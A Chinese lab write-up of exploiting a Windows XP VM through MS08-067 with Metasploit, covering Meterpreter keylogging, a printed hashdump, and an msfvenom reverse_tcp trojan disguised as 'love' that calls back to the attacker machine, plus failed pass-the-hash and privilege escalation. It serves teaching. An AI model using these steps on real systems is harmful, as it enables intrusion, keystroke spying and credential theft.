ailx10说：这篇是在2022年1月之前写的，后来又改过。这篇用了一个虚构的小黑故事开场，实验本身则是在自己的 XP 教学环境里进行。拿到会话以后，我继续用 Meterpreter 看主机信息、进程和截图，试输入记录，再往哈希和权限提升走。前面有能观察到的结果，后面两项并没有成功，我也没有把它们删掉只留漂亮输出。写这篇，是想把“连接上以后还能看什么”拆成一串具体问题，同时提醒自己，会话里显示了某种能力，不代表当前权限和环境就一定允许完成它。

---

原记录中的扫描地址与靶机地址不一致，相关命令仅作为历史记录，复现实验前必须按实际靶机地址核对。

本实验记录从历史漏洞测试获得会话后，对靶机信息与实验结果的观察。

你也可以参考David Kennedy的《Metasploit:The Penetration Tester's Guide》，清华大学诸葛建伟老师翻译的《Metasploit渗透测试指南》进行实验。

- 虚拟靶机：192.168.0.106（WinXP@hu、ailx13、ailx14用户）
- 虚拟小黑：192.168.0.104（Kali@ailx10）

**第一步：初始化环境\>在靶机上关闭防火墙**

通过Nmap对端口进行扫描，我们看到了靶机上开放了135、139、445、3389高危端口

![](/notes-assets/90b5863502aa392ff94d.jpg)

**第二步：在虚拟小黑上对虚拟靶机进行ms08067漏洞扫描**

```
nmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.0.102
```

![](/notes-assets/48d4aad53b68e5f5d3ce.webp)

**第三步：配置参数获得Shell大功告成**

![](/notes-assets/35f83d9684dffcdaea7b.jpg)

**第四步：使用screenshot命令截屏**

![](/notes-assets/2db0ca7e8ee9718fe85c.webp)![](/notes-assets/b70be9846e10b86531be.jpg)

**第五步：使用sysinfo命令查看计算机信息**

![](/notes-assets/0333454b9d2a9456562b.jpg)

**第六步：使用ps命令查看系统运行的进程**

![](/notes-assets/04138c3ec072b2f655f5.jpg)

找到记事本进程1524，后面可以记录虚拟靶机用户（学生ailx12）在记事本中写日记的内容。

![](/notes-assets/4d1693b548cc707820eb.webp)

**第七步：使用run post/windows/capture/keylog\_recorder命令获取键盘记录**

![](/notes-assets/21b085b97fba00d82844.jpg)

**第八步：在靶机的记事本中打字，写下今天的日记**

![](/notes-assets/fdc74acc7f9709a37cfa.webp)

**第九步：查看键盘记录的内容，成功看到虚拟靶机的记事本内容**

- 黑客会给你发一个网站，然后记录你在浏览器中输入的用户名和密码
- 如果你的电脑中了木马，只要你敲键盘，你的动作可能都会被捕捉

![](/notes-assets/7434651de155c6bab00f.webp)

**第十步：使用run post/windows/gather/hashdump命usr令获取密码哈希值**

![](/notes-assets/af8e63029d649ba7177a.jpg)

LM 字段中的固定占位值可能表示未保存 LM 哈希，不能仅凭该值断定账户密码为空。

![](/notes-assets/8f7cd2aec3bd22e3d20a.jpg)

```
Administrator:500:4159e786e2e935f8aad3b435b51404ee:28adbdb0c21b79ae0fc8a817134ed8c6:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

HelpAssistant:1000:9c5947b6961aa6c42c79a4f95229c735:1c8efd34c3f4a30e9b65f4b63f2ea519:::

SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:cf2a6e72fed6f0f0378af0c9b52e9332:::

hu:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

我们可以通过shell命令进入cmd命令行模式

![](/notes-assets/8216ef163e68a49f0f3a.jpg)

**第十一步：传递哈希值**

我们短时间破解不了哈希值的明文，怎么进一步呢？这里就要用到哈希传递技术。

在实验的过程中，遇到了坑，竟然不能用了，在XP上测试无效...

![](/notes-assets/78180b7fb1aeccefb701.jpg)

哈希传递在该实验中未成功，应根据工具输出、权限及目标配置排查，不能笼统归因于环境。

**第十二步：权限提升**

首先通过net user 创建2个普通用户ailx13和ailx14

![](/notes-assets/800ace94c8babbf68c1a.webp)

生成一个虚拟XP系统专用木马，放都虚拟靶机桌面，你可以假设这个以Love伪装的木马被用户ailx13下载了

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=443 -f exe -o ailx13_love.exe
```

![](/notes-assets/9eb6c93aa8eddfccbc35.jpg)

在虚拟小黑上监听咱们的这个木马

![](/notes-assets/997f3f65bcd47894ab75.webp)

当虚拟靶机用户ailx13运行了木马程序ailx13-love，咱们的虚拟小黑就获得了一个Shell

![](/notes-assets/8850e708ced7f7e29407.webp)

原实验看到与控制端的 TCP 连接；使用 443 端口或 reverse\_tcp 不代表协议是 HTTPS。

![](/notes-assets/c787f2269ca2b33be3f4.jpg)

该实验中的会话以普通用户运行；尝试提升权限没有成功，不能把它描述为管理员会话。

![](/notes-assets/d6b60e93d7c96158e19b.jpg)

原记录显示提权尝试未成功，原因未被证明；系统版本、进程权限和模块条件都可能影响结果。

- use priv
- getsystem

后两项没有成功，就把当时停住的位置讲清楚。工具能列出一个功能，并不保证当前条件能完成它；这些没有走通的分支，同样是理解会话边界的一部分。
